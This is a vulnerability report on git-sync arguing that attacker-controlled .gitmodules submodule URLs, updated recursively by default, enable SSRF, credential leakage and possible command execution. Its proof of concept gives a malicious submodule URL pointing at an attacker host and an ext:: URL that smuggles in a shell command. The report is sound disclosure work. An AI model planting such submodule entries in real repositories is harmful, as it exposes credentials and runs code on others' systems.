### Title
Unrestricted Attacker-Controlled Submodule URLs Enable Arbitrary Outbound Requests / Credential Disclosure via `git submodule update --recursive` - ([File: main.go])

### Summary
`git-sync` defaults to recursively updating git submodules on every sync [1](#0-0) , and the `--submodules` flag default is `recursive` [2](#0-1) . Submodule URLs are read from `.gitmodules`, which is untrusted content fully controlled by whoever can push a commit to the synced repository/ref. `git-sync` performs `git submodule update --init [--recursive]` against these attacker-supplied URLs with no protocol allow-listing or destination restriction of any kind [3](#0-2) .

### Finding Description
The root cause mirrors the Dexible bug class: an attacker-controlled parameter (there, the DEX "router"/spender address; here, the `.gitmodules` submodule URL) is used directly to make an external call carrying trust/credentials, without any allow-list or destination validation.

`configureWorktree` runs the submodule update unconditionally whenever `git.submodules != submodulesOff` (the default):
```go
if git.submodules != submodulesOff {
    submodulesArgs := []string{"submodule", "update", "--init"}
    if git.submodules == submodulesRecursive {
        submodulesArgs = append(submodulesArgs, "--recursive")
    }
    ...
    git.Run(ctx, worktree.Path(), submodulesArgs...)
}
``` [3](#0-2) 

Nowhere in `main.go` does `git-sync` set `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, `protocol.file.allow`, or any other allow-list to constrain what transports/hosts a submodule URL may target (repository-wide search found zero occurrences of these settings). The project's own e2e tests have to explicitly pass `-c protocol.file.allow=always` when constructing test fixtures, confirming that `git-sync` itself applies no such restriction at runtime [4](#0-3) .

Meanwhile `git-sync` is explicitly designed to hold and present real credentials (username/password, SSH keys, cookie files, GitHub App tokens, or dynamic `--askpass-url` responses) and even documents that multiple credentials may be scoped to different URLs specifically "when using submodules" via `--credential` [5](#0-4) . Because the `.gitmodules` file is attacker-controlled content in the synced repo, an attacker with only "push a commit" capability (e.g. a merged PR, or a tracked branch/ref they can influence) can add a submodule pointing to any URL of their choosing (arbitrary host/port, `file://` path, or, if the underlying git/environment permit it, `ext::` command transport). `git-sync` will then act on that URL exactly as it would a legitimate submodule — i.e., an "arbitrary external call" driven purely by untrusted repo content, analogous to the arbitrary router/spender call in the Dexible exploit.

### Impact Explanation
- **SSRF / persistent sync abuse:** Every sync cycle, `git-sync` will make outbound git-protocol connections to whatever host the attacker places in `.gitmodules`, from inside the pod/network where the sidecar runs — a classic SSRF primitive reachable purely from repo content.
- **Credential/token disclosure:** If any HTTP credential helper, cookie file, or askpass answer is not strictly host-scoped (or if the credential store matches loosely), an attacker-chosen submodule host can trigger git to present authentication material intended for the legitimate origin to the attacker's endpoint.
- **Local file / arbitrary command reach:** If the git binary or its config on the host has `protocol.file.allow`/`protocol.ext.allow` set more permissively than the strict "user" default (which `git-sync`'s own test suite deliberately overrides to `always` to exercise this exact code path), a malicious `.gitmodules` entry can escalate to local file disclosure or command execution during the submodule fetch.

This satisfies the required impact bar: file write/disclosure outside intended scope, credential/token disclosure, or an arbitrary external call driven by attacker-supplied data — all without any operator/privileged assumption.

### Likelihood Explanation
Any actor who can get a commit merged/synced into the tracked ref — a very common trust boundary for a CI/CD or GitOps sidecar (e.g. contributors, bots, or anyone whose PRs get auto-merged into a tracked branch) — can add or modify `.gitmodules`. `git-sync`'s default configuration (`--submodules=recursive`) makes this reachable without any special flag; the vulnerable code path executes on every sync cycle.

### Recommendation
- Set `GIT_ALLOW_PROTOCOL` (or `protocol.*.allow=never/user`) explicitly before invoking `git submodule update`, restricting submodule fetches to an explicit allow-list of protocols/hosts matching `--repo`'s trust domain.
- Do not default `--submodules` to `recursive`; require operators to opt in, and document the SSRF/credential-leak risk of untrusted submodule URLs.
- Ensure any credential material (askpass responses, cookie files, stored credentials) is strictly scoped per-URL and never presented to hosts that were not explicitly configured via `--credential`.

### Proof of Concept
1. Attacker with push/PR-merge access to the tracked repository adds `.gitmodules`:
   ```
   [submodule "evil"]
       path = evil
       url = http://attacker-controlled-host/collect
   ```
   (or, where local git config permits `ext::`/`file://` transports, `url = ext::sh -c "id > /tmp/pwned"`).
2. Commit and push to the ref that `git-sync --repo=... --ref=... --submodules=recursive` (default) is tracking.
3. On the next sync cycle, `configureWorktree` executes `git submodule update --init --recursive` [6](#0-5) , causing `git-sync` to make an outbound request to `http://attacker-controlled-host/collect` (or execute the `ext::` command), without any allow-list check having been applied by `git-sync`.
